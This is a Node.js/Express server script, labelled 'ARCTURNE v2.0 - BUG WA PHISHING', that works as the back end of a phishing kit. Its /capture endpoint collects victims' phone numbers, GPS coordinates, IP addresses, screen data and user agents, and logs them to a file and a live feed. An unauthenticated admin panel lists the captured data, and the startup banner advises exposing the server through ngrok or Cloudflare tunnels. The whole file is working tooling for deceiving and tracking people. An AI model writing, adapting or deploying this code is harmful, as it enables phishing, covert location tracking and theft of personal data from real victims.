const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);

const PORT = process.env.PORT || 3000;
const LOG_FILE = path.join(__dirname, 'logs', 'data.json');

// Inisialisasi log file
if (!fs.existsSync(path.join(__dirname, 'logs'))) {
    fs.mkdirSync(path.join(__dirname, 'logs'));
}
if (!fs.existsSync(LOG_FILE)) {
    fs.writeFileSync(LOG_FILE, JSON.stringify([]));
}

app.use(express.static('public'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Routes
app.get('/admin', (req, res) => {
    const logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));
    let html = `<h1>Admin Panel - Bug WA Phish</h1><table border="1"><tr><th>Time</th><th>IP</th><th>Phone</th><th>Method</th><th>GPS</th><th>Screen</th></tr>`;
    logs.forEach(log => {
        html += `<tr><td>${log.time}</td><td>${log.ip}</td><td>${log.phone}</td><td>${log.method}</td><td>${log.gps ? `${log.gps.lat}, ${log.gps.lng}` : 'N/A'}</td><td>${log.screen}</td></tr>`;
    });
    html += `</table><p>Total logs: ${logs.length}</p>`;
    res.send(html);
});

app.post('/capture', (req, res) => {
    const { phone, method, gps, screen, ip } = req.body;
    const logEntry = {
        time: new Date().toLocaleString('id-ID'),
        ip: ip || req.ip.replace('::ffff:', ''),
        phone,
        method,
        gps,
        screen,
        userAgent: req.headers['user-agent']
    };

    // Save to file
    const logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));
    logs.push(logEntry);
    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));

    // Emit real-time log via Socket.io
    io.emit('new_log', logEntry);

    // Console output (kaya di gambar)
    console.log(`
    \x1b[32m[+]\x1b[0m NEW VISITOR
    Session: wa-bug-${Math.floor(Math.random() * 100)}
    IP: ${logEntry.ip}
    Screen: ${screen}
    Time: ${logEntry.time}

    \x1b[32m[+]\x1b[0m LOCATION & DATA CAPTURED
    Phone: ${phone}
    Reason: ${method}_bug_exploit
    Source: GPS + Form Submit
    Coordinates: ${gps ? `${gps.lat}, ${gps.lng}` : 'N/A'}
    Accuracy: ${gps ? `${gps.accuracy}m` : 'N/A'}
    IP: ${logEntry.ip}
    Time: ${logEntry.time}
    GPS Active: ${gps ? 'Yes' : 'No'}
    `);

    res.json({ status: 'success', message: 'Bug sedang dikirim...' });
});

http.listen(PORT, () => {
    console.log(`
    \x1b[36m
    ARCTURNE v2.0 - BUG WA PHISHING
    ================================
    [ ] Initializing WA Bug phishing...
    [ ] Server operational on port ${PORT}
    [ ] GPS & Form Phishing Active

    [✓] BUG WA PHISHING DEPLOYED

    Session ID: wa-bug-${Math.floor(Math.random() * 100)}
    Session Dir: ${__dirname}
    Local URL: http://localhost:${PORT}
    Public URL: (Gunakan ngrok/cloudflare tunnel)
    Data Dir: ${path.join(__dirname, 'logs')}
    Admin: http://localhost:${PORT}/admin
    GPS status detection: Active
    IP addresses captured: Yes
    Admin panel with stats: Yes

    [!] Server running. Press [Ctrl+C] to stop.
    \x1b[0m
    `);
});

// Socket.io for real-time logs
io.on('connection', (socket) => {
    socket.emit('connected', { message: 'Connected to admin panel' });
});
